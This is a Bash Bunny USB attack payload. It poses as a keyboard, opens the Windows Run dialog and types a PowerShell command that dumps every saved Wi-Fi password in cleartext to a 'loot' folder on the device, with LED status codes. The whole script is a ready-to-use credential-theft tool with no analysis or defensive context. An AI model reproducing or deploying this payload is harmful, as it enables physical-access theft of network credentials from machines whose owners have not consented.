## Runs powershell

## dumps cleartext passwords as .xml files to loot folder

#
# R Blinking..... Running
#
# Green..............Finished



ATTACKMODE HID STORAGE

# Create directory under loot to store passwords in
mkdir -p /root/udisk/loot/WiPassDump

LED R 200

# Open windows run console

Q GUI r
Q DELAY 1000

# enter payload and execute

Q STRING powershell \$bunny\=\(gwmi win32_volume -f \'label=\\\"BashBunny\\\"\'\).NAME\; cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
Q ENTER

#Let code run, then sync

Q DELAY 5000

sync

# Done!

LED G
